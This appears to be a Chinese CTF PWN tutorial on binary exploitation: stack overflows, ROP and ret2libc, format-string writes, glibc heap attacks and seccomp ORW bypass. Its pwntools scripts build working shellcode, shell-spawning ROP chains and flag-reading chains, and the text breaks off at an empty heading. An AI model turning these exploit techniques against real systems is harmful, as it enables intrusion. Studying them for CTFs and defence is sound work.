# PWN 实战攻防：题型思路与工具深度使用

> PWN 的本质只有一件事：**控制程序的执行流**。无论是覆盖返回地址、篡改函数指针、还是伪造堆块，最终目的都是让程序跳到你想让它去的地方。本文不讲工具操作手册，只讲题型的攻击逻辑和工具在实战中的深度用法。

---

## 一、PWN 的本质

### 为什么能 PWN

```
源码 → 编译器 → 机器码 → 加载运行

程序运行时的核心事实：
1. 代码和数据都在内存中，地址可知
2. CPU 按指令流执行，执行流由寄存器/内存中的值决定
3. C 语言不检查边界，越界写能覆盖相邻内存

PWN 利用的就是这个：通过越界写或逻辑漏洞，修改控制数据（返回地址、函数指针、GOT 表项），劫持执行流。
```

### PWN 的核心循环

```
分析保护 → 找漏洞 → 确定利用方式 → 构造 payload → 调试验证

1. 分析保护：开了什么保护？决定能用什么攻击方式
2. 找漏洞：溢出点在哪？能写多少字节？写到什么位置？
3. 确定利用方式：根据保护和漏洞类型选择攻击路径
4. 构造 payload：拼地址、调偏移、绕约束
5. 调试验证：GDB 确认覆盖是否正确，本地通了再打远程
```

---

## 二、前置知识

### 2.1 栈帧结构

理解栈是所有 PWN 题的起点。x86-64 的栈帧结构：

```
高地址
┌──────────────────┐
│   参数 7+ (栈传)    │
├──────────────────┤
│   返回地址 (ret)    │  ← 溢出覆盖这里就劫持了执行流
├──────────────────┤
│   旧 rbp (saved)   │  ← 函数 prologue: push rbp
├──────────────────┤
│   局部变量          │  ← 溢出从这里开始往高地址写
│   buf[64]          │
│   ...              │
├──────────────────┤
│   rsp ──────────→  │  ← 栈顶
低地址
```

关键点：

- 栈从高地址向低地址增长，但 buf 内的写入是从低地址往高地址
- 溢出 buf → 覆盖 saved rbp → 覆盖返回地址
- 偏移 = buf 大小 + saved rbp（8 字节）。但编译器可能加对齐填充，实际偏移要以 cyclic 测量为准
- 32 位同理，只是每个单元 4 字节

### 2.2 调用约定

x86-64 Linux（System V AMD64 ABI）：

| 参数位置 | 寄存器 |
|----------|--------|
| 第 1 个参数 | rdi |
| 第 2 个参数 | rsi |
| 第 3 个参数 | rdx |
| 第 4 个参数 | rcx |
| 第 5 个参数 | r8 |
| 第 6 个参数 | r9 |
| 返回值 | rax |

系统调用约定：

| 参数位置 | 寄存器 |
|----------|--------|
| 系统调用号 | rax |
| 第 1 个参数 | rdi |
| 第 2 个参数 | rsi |
| 第 3 个参数 | rdx |
| 返回值 | rax |

32 位 x86：参数全走栈，从右到左压栈。这是 ret2libc 在 32 位和 64 位构造方式不同的根本原因。

### 2.3 保护机制

拿到题目的第一步：`checksec ./pwn`。保护机制决定你能用什么攻击方式：

| 保护 | 作用 | 对攻击的影响 |
|------|------|-------------|
| NX (No-eXecute) | 栈/堆不可执行 | 不能直接跳到栈上的 shellcode，需要 ROP |
| Canary | 返回地址前放随机值，函数返回前检查 | 覆盖返回地址前必须先泄露或绕过 canary |
| ASLR | 每次运行加载地址随机 | 不知道 libc/栈的绝对地址，需要先泄露 |
| PIE | 程序本身也随机加载 | 不知道程序内地址，需要泄露程序基址 |
| RELRO (Full) | GOT 表只读 | 不能改 GOT 表项做劫持 |

根据保护组合选择攻击路径：

```
NX 关 → ret2shellcode，往可写可执行区域写 shellcode
NX 开 → ROP / ret2libc / ret2csu

Canary 关 → 直接溢出覆盖返回地址
Canary 开 → 泄露 canary / 格式化字符串读 / 覆盖 __stack_chk_fail

ASLR 关 → 地址固定，直接硬编码
ASLR 开 → 泄露 libc 地址算偏移

PIE 关 → 程序地址固定，PLT/GOT 可直接用
PIE 开 → 泄露程序基址，或利用相对偏移

Full RELRO → 不能改 GOT，改 __malloc_hook / __free_hook / __exit_funcs
Partial RELRO / No RELRO → 可改 GOT 表
```

### 2.4 偏移定位：cyclic 方法

偏移算错，一切白费。cyclic 是最可靠的定位方法：

```bash
# 生成去重模式串
pwn cyclic 200 | ./pwn

# 程序崩溃后，看崩溃时 RIP/EBP 的值
# 假设崩溃在 0x6161616a（即 "aaaj"）

# 反查偏移
pwn cyclic -l 0x6161616a
# 输出: 72  ← 这就是从 buf 起始到返回地址的偏移
```

GDB + pwndbg 中更方便：

```gdb
# pwndbg 内置 cyclic
pwndbg> cyclic 200
# 发给程序后崩溃
pwndbg> cyclic -l $rsp  # 直接用寄存器值反查
```

注意事项：

- 64 位用 `cyclic -l $rsp` 或 `cyclic -l <RIP值>`，注意大小端
- 偏移不等于 buf 大小，编译器可能有对齐填充，永远以 cyclic 测量为准
- 如果程序读入用 `gets`（遇换行停），cyclic 生成的串里可能含换行字节，需要用 `cyclic -n 4` 保证 4 字节一组不含换行

---

## 三、栈溢出系列题型

栈溢出是 PWN 的入门题型，也是最核心的攻击手法。从简单到复杂，形成一条递进的攻击链。

### 3.1 ret2text：最简单的溢出

**场景**：程序里有后门函数（如 `win()` / `shell()` / `getflag()`），NX 开了但后门函数本身就是代码段，不受 NX 限制。

**解题思路**：

```
1. checksec → 看保护（通常 NX 开，PIE 关）
2. IDA 找后门函数地址（或 strings 找 "/bin/sh" + system 的交叉引用）
3. cyclic 测偏移
4. payload = padding + p64(backdoor_addr)
```

**坑点**：

- 64 位跳到某些地址时可能栈不对齐（`movaps` 要求 16 字节对齐），加一个 `ret` gadget 做栈对齐：

```python
# 加一个 ret gadget 让栈 16 字节对齐
ret = 0x40101a  # ROPgadget --binary pwn | grep ": ret"
payload = b'A' * offset + p64(ret) + p64(backdoor_addr)
```

### 3.2 ret2shellcode：执行自己的代码

**场景**：NX 关（栈/堆可执行），能把 shellcode 写到可执行区域。

**解题思路**：

```
1. checksec → 确认 NX 关
2. 找可写+可执行区域（vmmap 看权限，或 pwntools 的 ELF.read）
3. 写 shellcode 到该区域
4. 覆盖返回地址跳到 shellcode
```

**找可执行区域**：

```python
from pwn import *

elf = ELF('./pwn')
# 读 ELF 的段，找可写+可执行
for seg in elf.executable_segments():
    print(f"可执行段: {hex(seg.header.p_vaddr)} - {hex(seg.header.p_vaddr + seg.header.p_memsz)}")
```

GDB 中更直观：

```gdb
pwndbg> vmmap
# 找 rwx 权限的段
# 0x600000  0x601000  rwx  ...
```

**shellcode 生成**：

```python
from pwn import *
context.arch = 'amd64'

# 方法1：pwntools 一行生成
sc = asm(shellcraft.sh())                    # execve("/bin/sh", 0, 0)
sc = asm(shellcraft.cat('/flag'))             # open+read+write 读 flag

# 方法2：自定义（更短，适合空间受限）
sc = asm('''
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    mov al, 59
    syscall
''')
```

**坑点**：

- `gets` / `read` 可能截断 `\x00` 或换行，shellcode 不能含这些字节。用 `pwntools shellcraft` 的 `avoid` 参数过滤：

```python
sc = asm(shellcraft.sh().avoid(b'\x00\x0a\x0d'))
```

- 栈地址不确定时（ASLR），用 `jmp rsp` 跳板：

```python
# 如果知道溢出后 rsp 指向 payload 末尾附近
jmp_rsp = 0x401234  # ROPgadget | grep "jmp rsp"
payload = b'A' * offset + p64(jmp_rsp) + sc
```

### 3.3 ret2syscall：无 libc 时的系统调用

**场景**：NX 开，没有后门函数，静态链接（没有 libc），但有 ROP gadget 可以拼出 `execve("/bin/sh", NULL, NULL)`。

**解题思路（64 位）**：

```
1. 找 pop rdi; ret → 设置 rdi = "/bin/sh" 地址
2. 找 pop rsi; ret → 设置 rsi = 0
3. 找 pop rdx; ret → 设置 rdx = 0（或 pop rdx; pop rbx; ret）
4. 找 pop rax; ret → 设置 rax = 59 (execve)
5. 找 syscall; ret → 触发系统调用
6. 拼成 ROP chain
```

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./pwn')

# ROPgadget 查找
pop_rdi = 0x401233
pop_rsi = 0x401234
pop_rdx = 0x401235
pop_rax = 0x401236
syscall_ret = 0x401237
bin_sh = next(elf.search(b'/bin/sh'))

payload  = b'A' * offset
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59)
payload += p64(syscall_ret)
```

**32 位更简单**：参数全走栈，不需要 pop gadget：

```python
# 32 位 int 0x80
payload  = b'A' * offset
payload += p32(pop_eax) + p32(0xb)          # eax = 11 (execve)
payload += p32(pop_ebx) + p32(bin_sh)        # ebx = "/bin/sh"
payload += p32(pop_ecx) + p32(0)             # ecx = 0
payload += p32(pop_edx) + p32(0)             # edx = 0
payload += p32(int_0x80)
```

### 3.4 ret2libc：泄露 + 二次攻击

**场景**：动态链接，有 libc，NX 开。这是 PWN 中出现频率最高的题型。

**核心逻辑**：

```
第一次溢出：泄露 libc 函数地址 → 算出 libc 基址 → 算出 system + "/bin/sh"
第二次溢出：调用 system("/bin/sh")
```

**完整利用流程**：

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./pwn')
libc = ELF('./libc.so.6')  # 题目给的 libc

# ---- 第一步：泄露 libc ----
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = elf.symbols['main']

# 找 pop rdi; ret
pop_rdi = 0x401233  # ROPgadget --binary pwn | grep "pop rdi"
ret = 0x40101a      # 栈对齐用

# 构造 payload：调用 puts(puts_got) 然后返回 main
payload  = b'A' * offset
payload += p64(ret)              # 栈对齐
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)        # 回到 main，准备第二次溢出

p.sendline(payload)
p.recvuntil(b'\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"puts @ {hex(puts_addr)}")

# ---- 第二步：算 libc 基址 ----
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
log.info(f"libc base @ {hex(libc_base)}")

# ---- 第三步：第二次溢出 ----
payload2  = b'A' * offset
payload2 += p64(ret)             # 栈对齐
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()
```

**泄露函数的选择**：

| 函数 | 优点 | 缺点 |
|------|------|------|
| puts | 常见，会输出到换行，容易接收 | 输出遇换行停，可能截断 |
| printf | 常见 | 遇 `\x00` 截断 |
| write | 最可靠，指定长度输出 | 需要三个参数，构造稍复杂 |

**泄露函数的 GOT 选择**：泄露哪个函数的 GOT 都行，选 PLT 中有的。优先选已经调用过的函数（GOT 已解析，值确定）。

**没有题目 libc 怎么办**：

```bash
# 方法1：在线查 libc.rip
# 输入泄露的 puts 地址末 3 位 hex（如 6f0）
# 返回匹配的 libc 版本和下载链接

# 方法2：libc-database 本地查
./find.sh puts 6f0

# 方法3：用 one_gadget 代替 system
one_gadget libc.so.6
# 直接找一个能 getshell 的 gadget，省去构造 ROP 链
```

### 3.5 ret2csu：万能 ROP gadget

**场景**：64 位程序，找不到足够的 pop gadget 来设置 rdi/rsi/rdx，但程序中有 `__libc_csu_init` 函数（几乎所有 64 位 ELF 都有）。

`__libc_csu_init` 的结尾有一组固定的 gadget：

```
; gadget 1（从 __libc_csu_init 尾部）
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

; gadget 2（往前一点）
mov rdx, r14        ; rdx = r14
mov rsi, r13        ; rsi = r13
mov edi, r12d       ; edi = r12 低 32 位
call [r15 + rbx*8]  ; 调用 r15+rbx*8 指向的函数
add rbx, 1
cmp rbx, rbp
jne <gadget2>       ; 循环
```

利用方式：

```python
# 目标：调用 write(1, puts_got, 8) 泄露 libc
# write 的参数：rdi=1, rsi=puts_got, rdx=8

csu_end = 0x401234   # gadget 1 地址
csu_front = 0x40124a  # gadget 2 地址

# 设置 rbx=0, rbp=1（让 cmp 后不循环）
# r12=1 (edi=1), r13=puts_got (rsi=puts_got), r14=8 (rdx=8)
# r15=GOT 表中 write 条目的地址（注意不是 write 的地址，而是 GOT 中存 write 地址的那个槽的地址）

payload  = b'A' * offset
payload += p64(csu_end)
payload += p64(0)                # rbx = 0
payload += p64(1)                # rbp = 1
payload += p64(1)                # r12 → edi = 1
payload += p64(puts_got)         # r13 → rsi = puts_got
payload += p64(8)                # r14 → rdx = 8
payload += p64(elf.got['write']) # r15 → call [write_got]
payload += p64(csu_front)        # gadget 2
# gadget 2 执行完后会继续 pop 6 个，需要填充
payload += p64(0) * 6
payload += p64(main_addr)        # 返回 main
```

**csu 的价值**：在没有足够 pop gadget 的情况下，能控制 rdi/rsi/rdx 三个参数寄存器，实现任意函数调用。常见于静态编译或 gadget 缺失的题目。

### 3.6 栈迁移：溢出长度不够

**场景**：溢出只能覆盖到 saved rbp 和返回地址（16 字节），不够放 ROP chain。

**原理**：利用 `leave; ret` 指令做栈迁移。`leave` 等价于 `mov rsp, rbp; pop rbp`，两次 leave 就能把栈迁移到任意地址。

```
正常函数返回：
  leave → mov rsp, rbp; pop rbp   (rsp 指向返回地址)
  ret   → pop rip                 (跳到返回地址)

栈迁移（覆盖 saved rbp 为目标地址-8，返回地址为 leave;ret）：
  第一次 leave → mov rsp, rbp; pop rbp  (rsp 指向我们控制的区域)
  第二次 leave → mov rsp, rbp; pop rbp  (rsp 迁移到目标地址)
  ret → 跳到目标地址处的 ROP chain
```

```python
# 假设只能溢出 16 字节（覆盖 rbp + ret）
# buf 在 bss 段的地址已知（PIE 关）

leave_ret = 0x401234   # leave; ret 的地址
buf_addr = 0x601080    # bss 段可写区域

# 在 buf 里布置 ROP chain（通过第一次正常输入写入）
rop_chain = p64(pop_rdi) + p64(bin_sh) + p64(system_addr)

# 第一次输入：往 buf 写入 ROP chain
p.sendafter(b'input:', rop_chain)

# 第二次输入：溢出触发栈迁移
payload  = b'A' * (offset - 8)  # 填到 saved rbp
payload += p64(buf_addr + 8)     # saved rbp = 目标地址（ROP chain 起始位置前面一点）
payload += p64(leave_ret)        # 返回地址 = leave;ret，触发迁移
p.sendafter(b'input:', payload)
```

**坑点**：

- 迁移目标区域必须可写且地址已知
- 如果 PIE 开，需要先泄露程序基址才能知道 bss 地址
- 两次 `leave; ret` 的偏移计算容易出错，GDB 单步跟踪确认

---

## 四、格式化字符串漏洞

格式化字符串（Format String）是另一个高频题型。和栈溢出覆盖返回地址不同，格式化字符串直接读写任意地址。

### 4.1 漏洞原理

```c
// 危险写法：用户输入直接作为格式化字符串
char buf[100];
read(0, buf, 100);
printf(buf);   // ← 漏洞！用户控制格式化字符串

// 安全写法：
printf("%s", buf);
```

当用户控制格式化字符串时，可以用 `%n` 写内存、`%x` / `%p` 读栈、`%s` 读指针指向的字符串。

### 4.2 关键格式化符号

| 符号 | 功能 | 利用场景 |
|------|------|---------|
| `%p` | 以十六进制输出栈上的值 | 泄露栈/canary/libc 地址 |
| `%d` | 以十进制输出栈上的值 | 泄露小数值 |
| `%n` | 将已输出字节数写入对应参数指向的地址 | 任意地址写 |
| `%hn` | 写入 2 字节（低 16 位） | 分段写入，减少输出量 |
| `%hhn` | 写入 1 字节（低 8 位） | 分段写入，最灵活 |
| `%s` | 输出对应参数指向的字符串 | 泄露 GOT 表/libc 地址 |
| `%<N>$p` | 直接访问第 N 个参数 | 精确定位偏移 |
| `%<N>$n` | 直接写第 N 个参数指向的地址 | 精确定位偏移写入 |

### 4.3 确定偏移

第一步：确定格式化字符串在栈上的偏移位置。

```python
# 发送 AAAA%p.%p.%p.%p.%p.%p.%p.%p.
# 或者用 pwntools 的 FmtStr 类自动测
from pwn import *

def exec_fmt(payload):
    p = process('./pwn')
    p.sendline(payload)
    return p.recv()

# 自动测偏移
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
log.info(f"格式化字符串偏移: {offset}")
```

手动测偏移：

```python
# 64 位：前 6 个参数走寄存器（rdi, rsi, rdx, rcx, r8, r9），第 7 个开始走栈
# 如果 printf(buf) 中 buf 在栈上，偏移通常从 6 开始
# 发送 AAAA%6$p%7$p%8$p... 直到看到 0x41414141
p.sendline(b'AAAA%8$p')
# 如果输出包含 0x41414141，则偏移为 8
```

### 4.4 任意地址读：泄露 libc

```python
# 泄露 puts@got 的值（即 puts 的真实地址）
puts_got = elf.got['puts']

# 方法1：%s 泄露（puts_got 的地址作为参数）
payload = b'%7$s' + p64(puts_got)
# %7$s 会把栈上第 7 个参数当作 char* 输出其指向的字符串
# p64(puts_got) 放在 payload 末尾，对齐到第 7 个参数位置

# 方法2：用 pwntools 的 fmtstr
# 更推荐手动构造，因为 %s 泄露不是 fmtstr_payload 的标准用途
```

**对齐问题**：64 位下，`p64(addr)` 占 8 字节。格式化字符串的偏移必须对齐到 8 字节边界：

```python
# 假设偏移为 8，payload 前面部分必须占满对齐的字节数
# 格式化字符串部分 + padding = 8 的倍数
fmt = b'%9$s'           # 4 字节
padding = b'A' * 4      # 补齐到 8 字节
payload = fmt + padding + p64(puts_got)
# puts_got 在第 (4+4)/8 + 8 = 9 个参数位置
```

### 4.5 任意地址写：改 GOT / 返回地址

```python
from pwn import *

# 方法1：pwntools fmtstr_payload（最常用）
# 目标：把 printf@got 改成 system 的地址
offset = 8
writes = {
    elf.got['printf']: libc.symbols['system']
}
payload = fmtstr_payload(offset, writes, write_size='short')
# write_size='byte' → %hhn 逐字节写（最稳但最长）
# write_size='short' → %hn 逐 2 字节写（推荐）
# write_size='int' → %n 逐 4 字节写（值太大时输出量巨大，可能卡死）

# 方法2：手动构造（理解原理用）
# 以写入 0x401234 到地址 0x601040 为例
# 分两步：写低 2 字节 + 写高 2 字节
target_addr_lo = 0x601040
target_addr_hi = 0x601042
val_lo = 0x1234    # 低 2 字节
val_hi = 0x0040    # 高 2 字节

# %N$hn 写入 2 字节到第 N 个参数指向的地址
# 构造输出 val_lo 个字节，然后 %M$hn 写低 2 字节
# 构造输出 val_hi-val_lo 个字节，然后 %N$hn 写高 2 字节
```

### 4.6 常见利用方式

| 目标 | 方法 | 场景 |
|------|------|------|
| 泄露 libc | `%N$s` 读 GOT 表 | ret2libc 的前置步骤 |
| 改 GOT 表 | `fmtstr_payload` 改 `printf@got → system` | 输入 `/bin/sh` 后 printf 变成 system |
| 改返回地址 | `fmtstr_payload` 写栈上的返回地址 | 和栈溢出类似 |
| 改 `__malloc_hook` | 64 位写法，写 libc 中的 hook | Full RELRO 时改 GOT 不可行 |
| 覆盖 canary | `fmtstr_payload` 写栈上的 canary | 绕过 Canary 保护 |
| 任意写 `.fini_array` | 让程序退出时执行指定函数 | 程序退出时触发 |

### 4.7 格式化字符串 + 栈溢出组合

很多题目两种漏洞同时存在：

```python
# 典型场景：格式化字符串泄露 canary，栈溢出覆盖返回地址
# 第一步：泄露 canary
p.sendlineafter(b'> ', b'%23$p')  # canary 通常在 rbp-8，偏移需调试
canary = int(p.recv(18), 16)       # 接收 0xXXXXXXXXXXXXXXXX
log.info(f"canary: {hex(canary)}")

# 第二步：栈溢出，保留 canary
payload  = b'A' * (offset - 8)     # 填到 canary 位置
payload += p64(canary)             # 保持 canary 不变
payload += b'A' * 8                # saved rbp
payload += p64(ret) + p64(system_addr)  # 返回地址
```

---

## 五、堆利用

堆利用是 PWN 的高阶方向，理解门槛高但比赛分值也高。核心是理解 glibc malloc 的数据结构和分配/释放行为。

### 5.1 堆基础知识

```
glibc malloc 的核心数据结构：

chunk 结构（已分配）:
┌──────────────────┐
│ prev_size (8B)    │  ← 前一个 chunk 的大小（前一个空闲时才有效）
├──────────────────┤
│ size (8B)         │  ← 当前 chunk 大小 + 标志位
│                   │    A: 非主线程分配
│                   │    M: mmap 分配
│                   │    P: 前一个 chunk 在使用中
├──────────────────┤
│ 用户数据          │  ← malloc 返回的指针指向这里
│ ...               │
└──────────────────┘

chunk 结构（已释放）:
┌──────────────────┐
│ prev_size         │
├──────────────────┤
│ size              │
├──────────────────┤
│ fd                │  ← 指向同 bin 中下一个空闲 chunk
├──────────────────┤
│ bk                │  ← 指向同 bin 中上一个空闲 chunk
├──────────────────┤
│ fd_nextsize       │  ← 仅 large bin
├──────────────────┤
│ bk_nextsize       │  ← 仅 large bin
└──────────────────┘
```

**bin 分类**：

| bin | 大小范围 | 特点 |
|-----|---------|------|
| Fastbin | 0x20-0x80 (64位) | 单链表，LIFO，不合并 |
| Tcache | 0x20-0x410 (glibc 2.26+) | 单链表，LIFO，默认每个大小 7 个，检查最少 |
| Smallbin | 0x20-0x3f0 | 双链表，FIFO |
| Largebin | 0x400+ | 双链表，按大小排序 |
| Unsorted bin | 任意 | 释放后先放这里，下次分配时再分类 |

### 5.2 堆漏洞类型

**UAF (Use-After-Free)**：释放后未清空指针，仍然可以通过指针操作已释放的 chunk。这是堆利用最常见的入口。

```c
// UAF 示例
char *p = malloc(0x20);
free(p);
// p 没有置 NULL，仍然指向已释放的 chunk
p[0] = 'A';     // 写已释放的 chunk → 可以修改 fd/bk
puts(p);         // 读已释放的 chunk → 可以泄露 fd/bk
```

**Double Free**：同一个 chunk 被 free 两次，导致它出现在链表中两次，可以构造循环链表。

**Heap Overflow**：写 chunk 时越界，覆盖下一个 chunk 的 header。

**Off-by-One / Off-by-Null**：溢出 1 字节（或 1 个 null 字节），通常覆盖下一个 chunk 的 prev_size 或 size 的低字节。

### 5.3 堆利用思路

堆利用的核心链路：**漏洞 → 控制 chunk 的 fd/bk → 任意地址写 → 劫持控制流**

#### 5.3.1 tcache poisoning（glibc 2.26+）

tcache 检查最少，最容易利用：

```python
# 前提：有 UAF 漏洞，可以修改已释放的 tcache chunk 的 fd
# 目标：让 malloc 返回任意地址

# 步骤1：释放一个 chunk 进 tcache
free(A)    # A → tcache bin

# 步骤2：通过 UAF 修改 A 的 fd 为 target_addr
A.fd = target_addr    # tcache 链表：A → target_addr

# 步骤3：两次 malloc
malloc(0x20)  # 返回 A
malloc(0x20)  # 返回 target_addr！现在可以写 target_addr
```

pwntools 实战：

```python
from pwn import *

def alloc(size, data=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendafter(b'data: ', data)

# tcache poisoning
alloc(0x20, b'A')       # chunk 0
alloc(0x20, b'B')       # chunk 1（防止与 top chunk 合并）

free(0)                  # chunk 0 进 tcache
edit(0, p64(target_addr)) # 修改 fd 为目标地址

alloc(0x20)              # 拿回 chunk 0
alloc(0x20)              # 拿到 target_addr，可写

# 写入 __free_hook 或其他控制数据
```

#### 5.3.2 fastbin attack（glibc 2.26 以前或 tcache 满）

```python
# Double free 构造循环链表
free(A)
free(B)
free(A)    # A 在 fastbin 中出现两次：A → B → A → B → ...

# 修改 A 的 fd
edit(A, p64(target_addr))  # A → B → A → target_addr

# 三次 malloc 拿到 target_addr
malloc(0x20)  # 返回 A
malloc(0x20)  # 返回 B
malloc(0x20)  # 返回 target_addr
```

**fastbin 的 size 检查**：malloc 时会检查 chunk 的 size 字段是否和请求的 bin 大小匹配。target_addr 处需要一个伪造的 size 值。

```python
# 常见的伪造 size 的位置：
# __malloc_hook - 0x23 处有 0x7f（作为 size 的低字节）
# 这是因为对齐留下的残留数据
fake_chunk = libc.address + 0x3c4aed  # __malloc_hook 附近的 fake chunk
```

#### 5.3.3 unsorted bin attack

**目标**：把 libc 地址写到一个可控位置（不是任意写，是写一个 libc 的 unsorted bin 地址）。

```python
# 利用 unsorted bin 的 bk 指针
# free 一个大 chunk（不在 fastbin/tcache 范围）→ 进入 unsorted bin
# 此时 chunk 的 fd/bk 指向 main_arena + 96（libc 地址）

# 修改 bk 为 target_addr - 0x10
# malloc 触发时，会把 unsorted bin 的地址写到 target_addr

# 主要用途：
# 1. 泄露 libc（UAF 读 unsorted bin chunk 的 fd/bk）
# 2. 配合其他漏洞（如修改 global_max_fast，让更大的 chunk 也能进 fastbin）
```

#### 5.3.4 常见攻击目标

| 目标 | 位置 | 写入内容 | 适用 glibc |
|------|------|---------|-----------|
| `__malloc_hook` | libc 中 | one_gadget 地址 | ≤ 2.33 |
| `__free_hook` | libc 中 | system 地址 | ≤ 2.33 |
| `__exit_funcs` | libc 中 | 伪造函数指针 | 2.34+（hook 被移除后） |
| `_IO_list_all` | libc 中 | 伪造 FILE 结构 | 2.34+ |
| `rtld_global._dl_fini` | ld.so 中 | 函数指针 | 2.34+ |

**glibc 2.34+ 变化**：`__malloc_hook` 和 `__free_hook` 被移除，需要转向 FSOP（File Stream Oriented Programming）或 House of 系列新手法。

#### 5.3.5 House of 系列（高级）

| 名称 | 核心思路 | 前置条件 |
|------|---------|---------|
| House of Force | 溢出改 top chunk size，让之后所有 malloc 从任意地址分配 | 能溢出到 top chunk |
| House of Spirit | 在栈/bss 上伪造 chunk，free 后再 malloc 拿到 | 能控制 free 的指针 |
| House of Orange | 不用 free，通过修改 top chunk 触发 `_IO_flush_all_lockp` | 无 free 功能 |
| House of Einherjar | off-by-null 修改 prev_size + 伪造 prev chunk，触发向后合并 | off-by-null |
| House of Lore | 伪造 smallbin/largebin 的链表节点 | 可以泄露和修改 bin 链表 |
| House of Pig | largebin attack + FSOP，glibc 2.34+ 主流 | largebin + IO |
| House of Apple | `_IO_wfile_overflow` 路径利用，2.34+ | 伪造 FILE 结构 |

### 5.4 堆利用调试技巧

堆利用必须配合 GDB 动态调试，纯靠脑补会疯掉：

```gdb
# pwndbg 堆相关命令
pwndbg> heap              # 查看所有 chunk
pwndbg> bins              # 查看 fastbin/tcache/smallbin/unsorted bin
pwndbg> tcache            # 单独看 tcache
pwndbg> fastbins          # 单独看 fastbin
pwndbg> largebins         # 单独看 largebin
pwndbg> top_chunk         # 查看 top chunk
pwndbg> malloc_chunk 0x602000  # 查看指定地址的 chunk 结构

# 关键调试流程：
# 1. 每次 free 后看 bins 确认 chunk 进了哪个 bin
# 2. 每次 edit 后看 chunk 的 fd/bk 是否被正确修改
# 3. 每次 malloc 后确认返回的地址是否符合预期
# 4. 在 malloc/free 处下断点，观察分配行为
```

---

## 六、整数溢出

整数溢出本身不是直接的控制流劫持，但它能导致后续的缓冲区溢出或逻辑错误。

### 6.1 常见类型

| 类型 | 示例 | 后果 |
|------|------|------|
| 有符号→无符号 | `read(0, buf, (int)size)` 当 size < 0 | size 被解释为超大正数，read 写入巨量数据 |
| 无符号下溢 | `unsigned int len = 0; len -= 1;` | len 变成 0xFFFFFFFF |
| 整数截断 | `short size = 0x10001;` | size 变成 0x0001 |
| 乘法溢出 | `malloc(count * elem_size)` | 分配的空间远小于预期 |

### 6.2 解题思路

```python
# 典型场景：程序用 short 读 size，实际 read 用 int
# 输入 0x10001 → short 截断为 0x0001 → 分配 1 字节 → 但 read 读 0x10001 字节 → 溢出

# 另一种：负数绕过长度检查
# if (len <= 0x100) read(0, buf, len);
# 输入 -1 → 检查通过（-1 <= 0x100）→ read 0xFFFFFFFF 字节 → 溢出
p.sendlineafter(b'size: ', b'-1')
p.sendline(b'A' * 0x200 + p64(system_addr))
```

---

## 七、沙箱逃逸（ORW）

### 7.1 什么是沙箱

题目通过 seccomp 设置了系统调用过滤规则，通常禁用 execve，只允许 open/read/write。

```bash
# 分析沙箱规则
seccomp-tools dump ./pwn
```

典型输出：

```
 line  CODE  JT   JF      K
 0001: 0x20 0x00 0x00 0x00000000  A = sys_number
 0002: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0004
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0004: 0x06 0x00 0x00 0x00000000  return KILL
```

这表示只禁了 execve，open/read/write 都可以用。

### 7.2 ORW 利用思路

既然不能 getshell，就用 ROP 调 open → read → write 直接读 flag 文件：

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# 假设已经泄露了 libc 基址
libc_base = 0x7f0000000000  # 替换为实际泄露值
open_addr = libc_base + libc.symbols['open']
read_addr = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']

# 找 gadget
pop_rdi = libc_base + 0x23b6a
pop_rsi = libc_base + 0x251be
pop_rdx = libc_base + 0x27506  # pop rdx; pop rbx; ret

# bss 段放 flag 路径和读出内容
flag_str = libc_base + next(libc.search(b'/flag'))  # 或自己写
buf_addr = elf.bss() + 0x100

# ROP chain: open("/flag", 0) → read(fd, buf, 0x100) → write(1, buf, 0x100)
payload  = b'A' * offset

# open("/flag", O_RDONLY)
payload += p64(pop_rdi) + p64(flag_str)
payload += p64(pop_rsi) + p64(0)
payload += p64(open_addr)

# read(3, buf, 0x100)  ← fd=3 因为 0/1/2 被 stdin/stdout/stderr 占了
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(buf_addr)
payload += p64(pop_rdx) + p64(0x100) + p64(0)  # pop rbx padding
payload += p64(read_addr)

# write(1, buf, 0x100)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(buf_addr)
payload += p64(pop_rdx) + p64(0x100) + p64(0)
payload += p64(write_addr)
```

### 7.3 更严格的沙箱

如果 open 也被禁了：

```python
# 用 openat(257) 代替 open
# openat(AT_FDCWD, "/flag", O_RDONLY)
# AT_FDCWD = -100 (0xffffff9c)

# 如果 openat 也禁了，考虑：
# 1. 32 位兼容模式：x86 的系统调用号不同，可能绕过只过滤 64 位号的情况
# 2. 用 io_uring（新型系统调用）
# 3. side channel 盲注：逐字节猜 flag，根据时间差判断
```

32 位兼容模式绕过：

```python
# 某些沙箱只检查 64 位系统调用号
# 切到 32 位模式用 int 0x80
# 需要找 retf gadget 切换位宽

# 或者直接用 32 位 syscall：
# open 的 32 位系统调用号 = 5
# 用 retf 切换到 32 位模式后执行
```

---

## 八、工具深度使用

### 8.1 pwntools 进阶技巧

pwntools 的基础用法见 [pwntools 实战使用指南](pwntools实战使用指南.md)，这里讲实战中的进阶技巧。

#### 8.1.1 ROP 类的链式构造

